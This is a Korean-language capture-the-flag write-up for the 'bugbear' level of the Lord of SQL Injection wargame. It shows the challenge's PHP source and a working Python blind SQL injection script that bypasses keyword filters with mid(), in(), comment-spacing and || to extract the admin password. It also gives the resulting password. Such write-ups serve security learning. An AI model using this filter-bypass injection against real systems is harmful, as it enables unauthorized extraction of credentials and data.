# Lord of SQL Injection No.13 - bugbear

## 문제 출제 의도

=과 LIKE를 우회하고 각종 필터링을 우회하여 문제를 해결한다.

## 소스 코드 분석
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```
* preg_match()에서 no의 문자열에서 'prob','_','.','()','substr','ascii','=','or','and',' ','like','0x'를 필터링한다.

* preg_match()에서 pw의 문자열에서 '를 필터링한다.

* Blind SQL Injection임을 알 수 있다.

## 문제 해결방안
```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수

for i in range(1,9):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = '-1/**/||/**/mid(pw,1,{})/**/in("{}")'.format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```
* =과 like를 우회하기 위하여 in함수를 사용한다.

* substr를 우회하기 위하여 mid함수를 사용한다.

코드의 실행결과 735c2773가 출력되므로 …?pw=735c2773를 입력하면 문제풀이에 성공된다.